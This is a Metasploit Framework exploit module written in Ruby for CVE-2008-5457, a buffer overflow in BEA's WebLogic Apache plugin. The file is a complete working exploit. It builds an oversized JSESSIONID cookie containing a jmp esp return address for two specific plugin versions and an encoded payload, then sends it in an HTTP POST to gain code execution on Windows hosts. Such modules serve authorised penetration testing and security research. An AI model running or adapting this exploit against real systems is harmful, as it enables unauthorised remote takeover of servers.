##
# $Id: bea_weblogic_jsessionid.rb 9670 2010-07-03 03:19:07Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BEA WebLogic JSESSIONID Cookie Value Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in BEA\'s WebLogic plugin. The vulnerable
				code is only accessible when clustering is configured. A request containing a
				long JSESSION cookie value can lead to arbirtary code execution.
			},
			'Author'         => 'pusscat',
			'Version'        => '$Revision: 9670 $',
			'References'     =>
				[
					[ 'CVE', '2008-5457' ],
					[ 'OSVDB', '51311' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Privileged'     => true,
			'Platform'       => 'win',
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x0d\x0a\x20\x3B\x3D\x2C",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[  'Windows Apache 2.2 - WebLogic module version 1.0.1136334',
						{
							'Ret' => 0x1006c9b5,    # jmp esp
						}
					],
					[  'Windows Apache 2.2 - WebLogic module version 1.0.1150354',
						{
							'Ret' => 0x1006c9be,    # jmp esp
						}
					],
				],
			'DefaultTarget'  => 1,
			'DisclosureDate' => 'Jan 13 2009'))

		register_options(
			[
				Opt::RPORT(80)
			], self.class )
	end

	def exploit
		sploit = Rex::Text.rand_text_alphanumeric(10000, payload_badchars)
		sploit[8181, 4] = [target.ret].pack('V')
		sploit[8185, payload.encoded.length] = payload.encoded

		request =
			"POST /index.jsp HTTP/1.1\r\nHost: localhost\r\nCookie: TAGLINE=IAMMCLOVIN; JSESSIONID=" +
			sploit +
			"\r\n\r\n"

		connect
		sock.put(request);
		handler

		disconnect
	end

end